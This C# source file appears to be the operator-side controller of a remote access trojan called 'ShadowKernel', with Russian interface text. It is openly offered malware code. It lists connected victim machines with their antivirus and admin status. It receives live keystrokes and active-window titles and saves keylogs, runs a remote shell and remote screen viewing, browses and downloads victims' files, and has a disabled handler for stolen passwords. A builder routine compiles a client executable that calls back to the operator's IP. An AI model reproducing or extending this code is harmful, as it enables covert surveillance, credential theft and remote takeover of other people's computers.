using System;
using System.Windows;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Media;
using System.Windows.Forms;
using StreamLibrary;
using StreamLibrary.UnsafeCodecs;
using Microsoft.Toolkit.Uwp.Notifications;
using Telepathy;
using Message = Telepathy.Message;
using static ShadowKernel.Classes.Server;

using ShadowKernel.Classes;

namespace ShadowKernel.userControls
{

    public partial class SettingsServer : System.Windows.Controls.UserControl
    {
        
        private Classes.Settings.Values Settings;
        
        public Server serverFrm;
        private CompInfo CI = new CompInfo();
        private TaskManager TM = new TaskManager();
        private HardwareUsage HUV = new HardwareUsage();
        private FileExplorer FE = new FileExplorer();
        private RemoteShell RS = new RemoteShell();
        private Keylogger K = new Keylogger();
        public static Chat C = new Chat();
        public static Image ImageToDisplay;
        public static BackgroundWorker bwUpdateImage;
        public MainWindow wind;

        public static RDC RDC = new RDC();
        public static bool RDActive { get; set; }

        public SettingsServer(MainWindow wind)
        {
            
            InitializeComponent();
            Init();
            bwUpdateImage = ((BackgroundWorker)this.FindResource("backgroundWorker"));
            bwUpdateImage.WorkerSupportsCancellation = true;
            serverFrm = (Server)wind.stgServer;
            this.wind = wind;
        }
        public void Init()
        {
            
        }


        private void MenuItem_Click_1(object sender, RoutedEventArgs e)
        {
            
        }

        private void MenuItem_Click_2(object sender, RoutedEventArgs e)
        {
            MainWindow wind = (MainWindow)Window.GetWindow(this);
            SettingsNet stgNet = (SettingsNet)wind.stgNet;
            wind.GridMain.Children.Clear();
            wind.GridMain.Children.Add(stgNet);
        }
        private ushort GetPortSafe()
        {
            var portValue = Port.Text.ToString();
            ushort port;
            return (!ushort.TryParse(portValue, out port)) ? (ushort)0 : port;
        }
        private void ToggleListenerSettings(bool enabled)
        {
            btnListen.Content = enabled ? "Начать прослушивание" : "Остановить прослушивание";
            Port.IsEnabled = enabled;

            //ipv6.IsEnabled = enabled;
            //Upnp.Enabled = enabled;
        }
        private void GetDataLoop_Tick(object sender, EventArgs e)
        {
            GetRecievedData();
        }
        public void Button_Click(object sender, RoutedEventArgs e)
        {
            serverFrm = (Server)wind.server;
            serverFrm.GetDataLoop.Tick += new System.EventHandler(GetDataLoop_Tick); ;
            ushort port = GetPortSafe();
            if (btnListen.Content.ToString() == "Начать прослушивание")
            {
                try
                {
                    
                    MainServer.Start(port);
                    
                    serverFrm.GetDataLoop.Start();
                    //listenServer.Listen(port, ipv6.IsChecked);
                    ToggleListenerSettings(false);
                    wind.Title = "ShadowKernel";
                    wind.serverText.Text = "Сервер запущен";
                    wind.serverInd.Fill =System.Windows.Media.Brushes.Green;
                }
                catch (Exception)
                {
                    //listenServer.Disconnect();
                }
            }
            else if (btnListen.Content.ToString() == "Остановить прослушивание")
            {
                MainServer.Stop();
                serverFrm.GetDataLoop.Stop();
                serverFrm.dtgClients.Items.Clear();
                //listenServer.Disconnect();
                ToggleListenerSettings(true);
                wind.Title = "ShadowKernel - прослушивание [ " + Port.Text + "]";
                wind.serverText.Text = "Сервер не запущен";
                wind.serverInd.Fill = System.Windows.Media.Brushes.Red;
            }
        }

        public class MyItem
        {
            public string ID { get; set; }
            public string Admin { get; set; }
            public string IP { get; set; }
            public string Tag { get; set; }
            public string AV { get; set; }
            public string OS { get; set; }
            public string WT { get; set; }
        }

        /// <summary>
        /// Gets all data that has been sent to the server and handles it
        /// </summary>
        public void GetRecievedData()
        {

            Message Data;
            while (MainServer.GetNextMessage(out Data))
                switch (Data.eventType)
                {
                    case EventType.Connected:
                        string ClientAddress = MainServer.GetClientAddress(Data.connectionId);
                        serverFrm.dtgClients.Items.Add(new MyItem { ID = Data.connectionId.ToString(), IP = ClientAddress, Tag = "N/A", AV = "N/A", OS = "N/A",  WT = "N/A"});
                        if ((bool)notify.IsChecked)
                        {
                            new ToastContentBuilder()
                                .AddText("Подключён")
                                .AddText(string.Format("Клиент с адресом {0}", ClientAddress))
                                .Show();
                        }
                        break;

                    case EventType.Disconnected:
                        for (int n = serverFrm.dtgClients.Items.Count - 1; n >= 0; --n)
                        {
                            MyItem LVI = (MyItem)serverFrm.dtgClients.Items[n];
                            if (LVI.ID.Contains(Data.connectionId.ToString()))
                                serverFrm.dtgClients.Items.Remove(LVI);
                            if ((bool)notify.IsChecked)
                            {
                                new ToastContentBuilder().AddArgument("action", "viewConversation")
                                    .AddArgument("conversationId", 9813)
                                    .AddText("Отключён")
                                    .AddText(string.Format("Клиент с адресом {0}", LVI.IP))
                                    .Show();
                            }
                        }

                        break;

                    case EventType.Data:
                        HandleData(Data.connectionId, Data.data);
                        break;
                }
        }


        /// <summary>
        /// Handles data by switching between byte headers
        /// </summary>
        /// <param name="ConnectionId"></param>
        /// <param name="RawData"></param>
        public void HandleData(int ConnectionId, byte[] RawData)
        {
            
            byte[] ToProcess = RawData.Skip(1).ToArray();
            //Process type of data
            switch (RawData[0])
            {
                case 0: //Image Type
                    ImageToDisplay = ByteArrayToImage(ToProcess);
                    break;

                case 1: //Notification Type
                    var e = Encoding.UTF8.GetString(ToProcess);
                    if (e[0] == '1') { MainServer.Send(ConnectionId, Encoding.UTF8.GetBytes("GetDF{" + FE.currentDir.Text + "}"));e = e.Substring(1, e.Length - 1); }
                    System.Windows.Forms.MessageBox.Show(e, "Уведомление", MessageBoxButtons.OK,
                        MessageBoxIcon.Information);
                    break;

                case 2: //Client Tag Type
                    AddClientTag(ConnectionId, Encoding.UTF8.GetString(ToProcess));
                    break;

                case 3: //Process Type
                    UpdateRunningAppsListbox(ConnectionId, Encoding.UTF8.GetString(ToProcess));
                    break;

                case 4: //Information Type
                    UpdateComputerInformation(ConnectionId, Encoding.UTF8.GetString(ToProcess));
                    break;

                case 5: //File List Type
                    UpdateFiles(ConnectionId, Encoding.UTF8.GetString(ToProcess), "");
                    break;

                case 6: //Current Directory Type
                    UpdateCurrentDirectory(ConnectionId, Encoding.UTF8.GetString(ToProcess));
                    break;

                case 7: //Directory Up Type
                    UpdateCurrentDirectory(ConnectionId, Encoding.UTF8.GetString(ToProcess));
                    if (FE.Visibility == Visibility.Visible && FE.Title == "Проводник клиента - " + ConnectionId)
                        MainServer.Send(ConnectionId,Encoding.UTF8.GetBytes("GetDF{" + FE.currentDir.Text + "}"));
                    break;

                case 8: //File Type
                    if (FE.Visibility == Visibility.Visible && FE.ConnectionID == ConnectionId)
                    {
                        SaveFileDialog dlg = new SaveFileDialog();
                        dlg.FileName = TempDataHelper.FileName;
                        dlg.DefaultExt = TempDataHelper.FileExt;
                        dlg.Filter = "All files(*.*)|*.*";
                        if (dlg.ShowDialog() != DialogResult.Cancel)
                        {
                            File.WriteAllBytes(dlg.FileName, ToProcess);
                            System.Diagnostics.Process.Start("explorer.exe", dlg.FileName.Substring(0,dlg.FileName.LastIndexOf("\\")));
                        }
                        else { return; }
                        
                    }

                    break;

                case 9: //LogFileType
                    SaveFileDialog dlg1 = new SaveFileDialog();
                        dlg1.FileName = "KeyLoggs";
                        dlg1.DefaultExt = ".txt";
                        dlg1.Filter = "All files(*.*)|*.*";
                        if (dlg1.ShowDialog() != DialogResult.Cancel)
                        {
                            File.WriteAllBytes(dlg1.FileName, ToProcess);
                            System.Diagnostics.Process.Start("explorer.exe", dlg1.FileName.Substring(0,dlg1.FileName.LastIndexOf("\\")));
                        }
                        else { return; }
                    break;

                case 10: //Hardware Usage Type
                    UpdateHardwareUsage(ConnectionId, Encoding.UTF8.GetString(ToProcess));
                    break;

                case 11: //Keystroke Type
                    UpdateKeylogger(ConnectionId, Encoding.UTF8.GetString(ToProcess));
                    break;

                case 12: //Current Window Type
                    UpdateCurrentWindow(ConnectionId, Encoding.UTF8.GetString(ToProcess));
                    break;

                //case 13: //Audio Recording Type
                //    UpdateAudioRecording(ConnectionId, ToProcess);
                //    break;

                case 14: //Anti-Virus Tag
                    AddAntiVirus(ConnectionId, Encoding.UTF8.GetString(ToProcess));
                    break;

                case 15: //Windows Version Tag
                    AddOperatingSystem(ConnectionId, Encoding.UTF8.GetString(ToProcess));
                    break;

                case 16: //Message Type
                    AddMessage(ConnectionId, Encoding.UTF8.GetString(ToProcess));
                    break;

                //case 17: //Passwords Type
                //    AddPasswords(ConnectionId, Encoding.UTF8.GetString(ToProcess));
                //    break;

                case 18: //Remote Shell Type
                    UpdateRemoteShell(ConnectionId, Encoding.UTF8.GetString(ToProcess));
                    break;

                case 19: //Update Drive Type
                    UpdateDriveInfo(ConnectionId, Encoding.UTF8.GetString(ToProcess));
                    break;

                //case 20: //Message Type
                //    AddWindTitle(ConnectionId, Encoding.UTF8.GetString(ToProcess));
                //    break;
                
                case 21: //Admin Type
                    AddAdmin(ConnectionId, Encoding.UTF8.GetString(ToProcess));
                    break;
            }
        }


        /// <summary>
        /// Gets client tag from client then updates list item
        /// </summary>
        /// <param name="ConnectionId"></param>
        /// <param name="Tag"></param>
        private void AddClientTag(int ConnectionId, string Tag)
        {

            for (int n = serverFrm.dtgClients.Items.Count - 1; n >= 0; --n)
            {
                MyItem LVI = (MyItem)serverFrm.dtgClients.Items[n];
                if (LVI.ID.Contains(ConnectionId.ToString()))
                    LVI.Tag = Tag;
                    serverFrm.dtgClients.Items[n] = LVI;
                
                serverFrm.dtgClients.Items.Refresh();
                //if (Settings.GetNotifyValue())
                //{
                //    NB = new NotificationBox();
                //    NB.ClientTag = Tag;
                //    NB.IP = Classes.Server.MainServer.GetClientAddress(ConnectionId);
                //    NB.Show();
                //}
            }
        }


        /// <summary>
        /// Gets Admin from client then updates list item
        /// </summary>
        /// <param name="ConnectionId"></param>
        /// <param name="Admin"></param>
        private void AddAdmin(int ConnectionId, string Admin)
        {

            for (int n = serverFrm.dtgClients.Items.Count - 1; n >= 0; --n)
            {
                MyItem LVI = (MyItem)serverFrm.dtgClients.Items[n];
                if (LVI.ID.Contains(ConnectionId.ToString()))
                    LVI.Admin = Admin;
                serverFrm.dtgClients.Items[n] = LVI;

                serverFrm.dtgClients.Items.Refresh();
            }
        }


        ///// <summary>
        ///// Gets active window title from client then updates list item
        ///// </summary>
        ///// <param name="ConnectionId"></param>
        ///// <param name="Tag"></param>
        //private void AddWindTitle(int ConnectionId, string Title)
        //{

        //    for (int n = serverFrm.dtgClients.Items.Count - 1; n >= 0; --n)
        //    {
        //        MyItem LVI = (MyItem)serverFrm.dtgClients.Items[n];
        //        if (LVI.ID.Contains(ConnectionId.ToString()))
        //            LVI.WT = Title;
        //        serverFrm.dtgClients.Items[n] = LVI;

        //        serverFrm.dtgClients.Items.Refresh();
        //    }
        //}

        /// <summary>
        /// Gets anti-virus from client then updates list item
        /// </summary>
        /// <param name="ConnectionId"></param>
        /// <param name="AntiVirus"></param>
        private void AddAntiVirus(int ConnectionId, string AntiVirus)
        {

            for (int n = serverFrm.dtgClients.Items.Count - 1; n >= 0; --n)
            {
                MyItem LVI = (MyItem)serverFrm.dtgClients.Items[n];
                if (LVI.ID.Contains(ConnectionId.ToString()))
                    LVI.AV= AntiVirus;
                    serverFrm.dtgClients.Items[n] = LVI;
                serverFrm.dtgClients.Items.Refresh();
            }
        }

        /// <summary>
        /// Gets operating system from client then updates list item
        /// </summary>
        /// <param name="ConnectionId"></param>
        /// <param name="OperatingSystem"></param>
        private void AddOperatingSystem(int ConnectionId, string OperatingSystem)
        {
            for (int n = serverFrm.dtgClients.Items.Count - 1; n >= 0; --n)
            {
                MyItem LVI =(MyItem)serverFrm.dtgClients.Items[n];
                if (LVI.ID.Contains(ConnectionId.ToString()))
                    LVI.OS= OperatingSystem;
                    
                    serverFrm.dtgClients.Items[n] = LVI;
                serverFrm.dtgClients.Items.Refresh();
            }
        }


        /// <summary>
        /// Updates currently selected window on keylogger
        /// </summary>
        /// <param name="ConnectionId"></param>
        /// <param name="WindowName"></param>
        public void UpdateCurrentWindow(int ConnectionId, string WindowName)
        {
            foreach (Keylogger K in System.Windows.Application.Current.Windows.OfType<Keylogger>())
                if (K.Visibility == Visibility.Visible && K.ConnectionID == ConnectionId && K.Update)
                    K.CurWindow.Text = " Активное окно: [ " + WindowName + " ] ";
        }

        /// <summary>
        /// Updates keylogger
        /// </summary>
        /// <param name="ConnectionId"></param>
        /// <param name="Keystroke"></param>
        public void UpdateKeylogger(int ConnectionId, string Keystroke)
        {
            foreach (Keylogger K in System.Windows.Application.Current.Windows.OfType<Keylogger>())
                if (K.Visibility == Visibility.Visible && K.ConnectionID == ConnectionId && K.Update)
                {
                    K.txtKeylogger.AppendText(Keystroke);
                    K.txtKeylogger.ScrollToEnd();
                    return;
                }

            K = new Keylogger();
            K.Show();
            K.ConnectionID = ConnectionId;
            K.Title = "Кейлоггер - " + ConnectionId;
            if (K.ConnectionID == ConnectionId) { K.txtKeylogger.AppendText(Keystroke); K.txtKeylogger.ScrollToEnd(); } 
        }

        /// <summary>
        /// Updates hardware usage data
        /// </summary>
        /// <param name="ConnectionId"></param>
        /// <param name="UsageData"></param>
        public void UpdateHardwareUsage(int ConnectionId, string UsageData)
        {
            
            foreach (HardwareUsage HUV in System.Windows.Application.Current.Windows.OfType<HardwareUsage>())
                if (HUV.Visibility == Visibility.Visible && HUV.ConnectionID == ConnectionId && HUV.Update)
                {
                    double CPUUsageRaw = Convert.ToDouble(GetSubstringByString("{", "}", UsageData));
                    string CPUUsageString = Convert.ToInt32(CPUUsageRaw).ToString();
                    string RamAmount = GetSubstringByString("[", "]", UsageData);
                    double DiskUsageRaw = Convert.ToDouble(GetSubstringByString("<", ">", UsageData));
                    string DiskUsageString = Convert.ToInt32(DiskUsageRaw).ToString();
                    HUV.RAM.Text = RamAmount;
                    HUV.CPU.Text = CPUUsageString;
                    HUV.DISK.Text = DiskUsageString;
                    return;
                }

            if (HUV.Visibility == Visibility.Visible && HUV.title.Text == "Производительность клиента - " + ConnectionId)
            {
                double CPUUsageRaw = Convert.ToDouble(GetSubstringByString("{", "}", UsageData));
                string CPUUsageString = Convert.ToInt32(CPUUsageRaw).ToString();
                string RamAmount = GetSubstringByString("[", "]", UsageData);
                double DiskUsageRaw = Convert.ToDouble(GetSubstringByString("<", ">", UsageData));
                string DiskUsageString = Convert.ToInt32(DiskUsageRaw).ToString();
                HUV.RAM.Text = RamAmount;
                HUV.CPU.Text = CPUUsageString;
                HUV.DISK.Text = DiskUsageString;
            }

            HUV = new HardwareUsage();
            HUV.Show();
            HUV.ConnectionID = ConnectionId;
            HUV.title.Text = "Производительность клиента - " + ConnectionId;
        }

        /// <summary>
        /// Updates file browser current directory
        /// </summary>
        /// <param name="ConnectionId"></param>
        /// <param name="CurrentDirectory"></param>
        public void UpdateCurrentDirectory(int ConnectionId, string CurrentDirectory)
        {
            foreach (FileExplorer FE in System.Windows.Application.Current.Windows.OfType<FileExplorer>())
                if (FE.Visibility == Visibility.Visible && FE.ConnectionID == ConnectionId && FE.Update)
                    FE.currentDir.Text = CurrentDirectory;
        }

        public struct sFile
        {
            public string fName { get; set; }
            public string fExt { get; set; }
            public string fDate { get; set; }
            public string fSize { get; set; }
            
        }

        /// <summary>
        /// Updates files in file browser
        /// </summary>
        /// <param name="ConnectionId"></param>
        /// <param name="Files"></param>
        /// <param name="CurrentDirectory"></param>
        public void UpdateFiles(int ConnectionId, string Files, string CurrentDirectory)
        {
            string[] FilesArrayRaw = Files.Split(new[] { "][" }, StringSplitOptions.None);
            string[] FilesArray = FilesArrayRaw.Skip(1).ToArray();
            foreach (FileExplorer FE in System.Windows.Application.Current.Windows.OfType<FileExplorer>())
                if (FE.Visibility == Visibility.Visible && FE.ConnectionID == ConnectionId && FE.Update)
                {
                    sFile[] file = new sFile[FilesArray.Length]; 
                    FE.dtgFiles.ItemsSource = null;
                    for (int i = 0; i < FilesArray.Length; i++)
                    {
                        file[i].fName= GetSubstringByString("{", "}", FilesArray[i]);
                        file[i].fExt = GetSubstringByString("<", ">", FilesArray[i]);
                        file[i].fDate = GetSubstringByString("[", "]", FilesArray[i]);
                        file[i].fSize = GetSubstringByString("fS(", ")fS", FilesArray[i]);
                    }
                    FE.dtgFiles.ItemsSource = file;
                    FE.dtgFiles.Items.Refresh();

                    return;
                }

            FE = new FileExplorer();
            FE.Show();
            FE.ConnectionID = ConnectionId;
            FE.Title = "Проводник клиента - " + FE.ConnectionID;
            if (FE.ConnectionID == ConnectionId)
            {
                sFile[] file = new sFile[FilesArray.Length];
                FE.dtgFiles.ItemsSource = null;
                for (int i = 0; i < FilesArray.Length; i++)
                {
                    file[i].fName = GetSubstringByString("{", "}", FilesArray[i]);
                    file[i].fExt = GetSubstringByString("<", ">", FilesArray[i]);
                    file[i].fDate = GetSubstringByString("[", "]", FilesArray[i]);
                    file[i].fSize = GetSubstringByString("fS(", ")fS", FilesArray[i]);
                }
                FE.dtgFiles.ItemsSource = file;
                FE.dtgFiles.Items.Refresh();

            }
        }

        public struct driveInfo
        {
            public string dId { get; set; }
            public string dType { get; set; }
            public string dFree { get; set; }
            public string dSize { get; set; }
            public string dVolume { get; set; }
            public string dPercent { get; set; }

        }

        /// <summary>
        /// Updates drives info in file browser
        /// </summary>
        /// <param name="ConnectionId"></param>
        /// <param name="Files"></param>
        /// <param name="CurrentDirectory"></param>
        public void UpdateDriveInfo(int ConnectionId, string Info)
        {
            string[] infoArrayRaw = Info.Split(new[] { "][" }, StringSplitOptions.None);
            string[] infoArray = infoArrayRaw.Skip(1).ToArray();
            foreach (FileExplorer FE in System.Windows.Application.Current.Windows.OfType<FileExplorer>())
                if (FE.Visibility == Visibility.Visible && FE.ConnectionID == ConnectionId && FE.Update)
                {
                    driveInfo[] info = new driveInfo[infoArray.Length];
                    FE.dtgDrives.ItemsSource = null;
                    for (int i = 0; i < infoArray.Length; i++)
                    {
                        info[i].dId = GetSubstringByString("dI{", "}dI", infoArray[i]);
                        info[i].dType = GetSubstringByString("dT{", "}dT", infoArray[i]);
                        info[i].dFree = GetSubstringByString("dF{", "}dF", infoArray[i]);
                        info[i].dSize = GetSubstringByString("dS{", "}dS", infoArray[i]);
                        info[i].dVolume = GetSubstringByString("dV{", "}dV", infoArray[i]);
                        info[i].dPercent = GetSubstringByString("dP{", "}dP", infoArray[i]);
                    }
                    FE.dtgDrives.ItemsSource = info;
                    FE.dtgDrives.Items.Refresh();

                    return;
                }
        }

            /// <summary>
            /// Updates computer information form
            /// </summary>
            /// <param name="ConnectionId"></param>
            /// <param name="Info"></param>
            public void UpdateComputerInformation(int ConnectionId, string Info)
        {
            string[] InfoArray = Info.Split(',');
            List<string> InfoList = new List<string>(InfoArray);
            foreach (CompInfo CI in System.Windows.Application.Current.Windows.OfType<CompInfo>())
                if (CI.Visibility== Visibility.Visible && CI.ConnectionID == ConnectionId && CI.Update)
                {
                    CI.clientInfo.Items.Clear();
                    CI.clientInfo.ItemsSource = InfoList.Skip(1).ToArray<string>();
                    //CI.clientInfo.Items.Remove("");
                    CI.clientInfo.Items.Refresh();
                    return;
                }

            CI = new CompInfo();
            CI.Show();
            CI.ConnectionID = ConnectionId;
            CI.Title = "Информация о компьютере клиента - " + CI.ConnectionID;
            if (CI.ConnectionID == ConnectionId)
            {
                CI.clientInfo.Items.Clear();
                CI.clientInfo.ItemsSource = InfoList.Skip(1).ToArray();
                //CI.clientInfo.Items.Remove("");
                CI.clientInfo.Items.Refresh();
            }
        }
        public static string GetSubstringByString(string a, string b, string c)
        {
            try
            {
                return c.Substring(c.IndexOf(a) + a.Length, c.IndexOf(b) - c.IndexOf(a) - a.Length);
            }
            catch { }

            return "";
        }

       public struct Process
        {
            public string pName { get; set; }
            public string pID { get; set; }
            public string pResponding { get; set; }
            public string pTitle { get; set; }
            public string pMemory { get; set; }
            public string pModule { get; set; }
        }
        /// <summary>
        /// Updates process list
        /// </summary>
        /// <param name="ConnectionId"></param>
        /// <param name="Processes"></param>
        public void UpdateRunningAppsListbox(int ConnectionId, string Processes)
        {
            
            string[] ProcessesArrayRaw = Processes.Split(new[] { "][" }, StringSplitOptions.None);
            string[] ProcessesArray = ProcessesArrayRaw.Skip(1).ToArray();
            List<string> ProcessesList = new List<string>(ProcessesArray);
            ProcessesList.AddRange(ProcessesArray);
            foreach (TaskManager TM in System.Windows.Application.Current.Windows.OfType<TaskManager>())
                if (TM.Visibility == Visibility.Visible && TM.ConnectionID == ConnectionId && TM.Update)
                {
                    Process[] p = new Process[ProcessesArray.Length-1];
                    TM.clientProcesses.ItemsSource = null;
                    for(int i = 0; i < ProcessesArray.Length-1; i++)
                    {

                        p[i].pName = GetSubstringByString("p1", "}", ProcessesArray[i]);
                        p[i].pID = GetSubstringByString("p2", "{", ProcessesArray[i]);
                        p[i].pResponding = GetSubstringByString("p3", ";", ProcessesArray[i]);
                        p[i].pTitle = GetSubstringByString("p4", ">", ProcessesArray[i]);
                        p[i].pMemory = GetSubstringByString("p5", "<", ProcessesArray[i]);
                        p[i].pModule = GetSubstringByString("p6", "]", ProcessesArray[i]);

                    }
                    TM.clientProcesses.ItemsSource = p;
                    TM.clientProcesses.Items.Refresh();

                    return;
                }

            TM = new TaskManager();
            TM.Show();
            TM.ConnectionID = ConnectionId;
            TM.Title = "Прцоессы на компьютере клиента - " + TM.ConnectionID;
            if (TM.ConnectionID == ConnectionId)
            {
                Process[] p = new Process[ProcessesArray.Length - 1];
                TM.clientProcesses.ItemsSource = null;
                for (int i = 0; i < ProcessesArray.Length-1; i++)
                {

                    p[i].pName = GetSubstringByString("p1", "}", ProcessesArray[i]);
                    p[i].pID = GetSubstringByString("p2", "{", ProcessesArray[i]);
                    p[i].pResponding = GetSubstringByString("p3", ";", ProcessesArray[i]);
                    p[i].pTitle = GetSubstringByString("p4", ">", ProcessesArray[i]);
                    p[i].pMemory = GetSubstringByString("p5", "<", ProcessesArray[i]);
                    p[i].pModule = GetSubstringByString("p6", "]", ProcessesArray[i]);

                }
                TM.clientProcesses.ItemsSource = p;
                TM.clientProcesses.Items.Refresh();
            }
        }

        /// <summary>
        /// Update remote shell with output
        /// </summary>
        /// <param name="ConnectionId"></param>
        /// <param name="Output"></param>
        public void UpdateRemoteShell(int ConnectionId, string Output)
        {
            foreach (RemoteShell RS in System.Windows.Application.Current.Windows.OfType<RemoteShell>())
                if (RS.Visibility == Visibility.Visible && RS.ConnectionID == ConnectionId && RS.Update)
                {
                    if (string.IsNullOrWhiteSpace(RS.console.Text))
                        RS.console.Text = Output;
                    else
                        RS.console.Text += (Environment.NewLine + Environment.NewLine + Output);
                    return;
                }

            RS = new RemoteShell();
            RS.ConnectionID = ConnectionId;
            RS.Title = "Командная строка - " + ConnectionId;
            RS.Show();
            if (RS.ConnectionID == ConnectionId)
            {
                if (string.IsNullOrWhiteSpace(RS.console.Text))
                    RS.console.Text = Output;
                else
                    RS.console.Text += (Environment.NewLine + Environment.NewLine + Output);
            }
        }


        /// <summary>
        /// Add message to chat
        /// </summary>
        /// <param name="ConnectionId"></param>
        /// <param name="Message"></param>
        public void AddMessage(int ConnectionId, string Message)
        {
            foreach (Chat C in System.Windows.Application.Current.Windows.OfType<Chat>())
                if (C.Visibility == Visibility.Visible && C.ConnectionID == ConnectionId && C.Update)
                {
                    //C.txtChat.AppendText(Environment.NewLine + GetClientTagFromId(ConnectionId) + ": " + Message);
                    System.Windows.Controls.ContentControl t = new System.Windows.Controls.ContentControl();
                    t.Content = Message + Environment.NewLine + DateTime.Now.ToString("HH:mm");
                    Chat c = new Chat();
                    Style style = c.FindResource("BubbleLeftStyle") as Style;
                    t.Style = style;
                    C.chatPlace.Children.Add(t);
                }
        }

        /// <summary>
        /// Convert byte array to image
        /// </summary>
        /// <param name="ByteArrayIn"></param>
        /// <returns></returns>
        public Image ByteArrayToImage(byte[] ByteArrayIn)
        {
            IUnsafeCodec UC = new UnsafeStreamCodec(50);
            using (var MS = new MemoryStream(ByteArrayIn))
            {
                try
                {
                    return UC.DecodeData(MS);
                }
                catch
                {
                    return null;
                }
            }
        }

        public static  void RemoteDesktop_Click(string ID)
        {
            try
            {
                if (RDActive)
                {
                    System.Windows.Forms.MessageBox.Show("Просмотр экрана уже запущен!", "Error", MessageBoxButtons.OK,
                        MessageBoxIcon.Error);
                    return;
                }
                if (bwUpdateImage.IsBusy) return;
                RDActive = true;
                MainServer.Send(Convert.ToInt16(ID), Encoding.UTF8.GetBytes("StartRD"));
                RDC = new RDC();
                RDC.ConnectionID = Convert.ToInt32(ID);
                RDC.Title = "Просмотр экрана - " + ID;
                RDC.Show();
                bwUpdateImage.RunWorkerAsync();

            }
            catch
            {

            }
        }

        private void bwUpdateImage_DoWork(object sender, DoWorkEventArgs e)
        {
            while (RDActive)
                try
                {
                    if (!RDC.Update)
                    {
                        RDActive = false;
                        break;
                    }


                    using (Bitmap SRC = new Bitmap(ImageToDisplay))
                    {
                        Bitmap DEST = new Bitmap(Convert.ToInt32(RDC.desktop.Width), Convert.ToInt32(RDC.desktop.Height),
                            System.Drawing.Imaging.PixelFormat.Format32bppPArgb);
                        using (Graphics G = Graphics.FromImage(DEST))
                        {
                            G.DrawImage(SRC, new Rectangle(System.Drawing.Point.Empty, DEST.Size));
                        }
                        if (RDC.desktop.InvokeRequired)
                            RDC.desktop.Invoke((MethodInvoker)delegate { RDC.desktop.Image = DEST; });
                        else
                            RDC.desktop.Image = DEST;

                    }


                }
                catch  { }
        }

        private void Port_SelectionChanged(object sender, RoutedEventArgs e)
        {
            var port = GetPortSafe();
            if (port == 0 || port > 65535)
            {
                Port.Text = "1";
            }
            else
            {
                Properties.Settings.Default.Port = Convert.ToInt32(Port.Text);
                Properties.Settings.Default.Save();
            }
        }

        private void UpInt_SelectionChanged(object sender, RoutedEventArgs e)
        {
            ushort port;
            port = (!ushort.TryParse(UpInt.Text, out port)) ? (ushort)0 : port;
            if (port == 0 || port > 10000)
            {
                UpInt.Text = "1";
            }
            Properties.Settings.Default.UpdateInterval = Convert.ToInt32(UpInt.Text);
            Properties.Settings.Default.Save();

        }

        private void CheckBox_Click(object sender, RoutedEventArgs e)
        {
            Properties.Settings.Default.Notfiy = (bool)notify.IsChecked;
            Properties.Settings.Default.Save();
        }

        private void UserControl_Loaded(object sender, RoutedEventArgs e)
        {
            Port.Text = Properties.Settings.Default.Port.ToString();
            UpInt.Text = Properties.Settings.Default.UpdateInterval.ToString();
            notify.IsChecked = Properties.Settings.Default.Notfiy;
        }

        private void Button_Click_1(object sender, RoutedEventArgs e)
        {
            if(Tag.Text == "") { Tag.Focus(); return; }

            string hostName = System.Net.Dns.GetHostName();
            string myIP = System.Net.Dns.GetHostAddresses(hostName)[1].ToString();

            Builder ClientBuilder = new Builder();
            try
            {
                Convert.ToInt16(Port.Text);
            }
            catch (Exception EX)
            {
                System.Windows.Forms.MessageBox.Show("Error: " + EX.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            SaveFileDialog dlg = new SaveFileDialog();
            //dlg.InitialDirectory = Environment.CurrentDirectory + @"\Clients";
            dlg.DefaultExt = ".exe"; // Default file extension
            dlg.Filter = "Exe Files (.exe)|*.exe|All Files (*.*)|*.*";

            if (dlg.ShowDialog() != DialogResult.Cancel)
            {
                // Save document
                ClientBuilder.BuildClient(Port.Text, ShadowKernel.helper.Session.CurrentAuditer.Login.ToString(), myIP, dlg.FileName, Tag.Text, "1",
                "False", "False");
                System.Diagnostics.Process.Start("explorer.exe", dlg.FileName.Substring(0, dlg.FileName.LastIndexOf("\\")));

            }
            else { return; }

        }
    }
}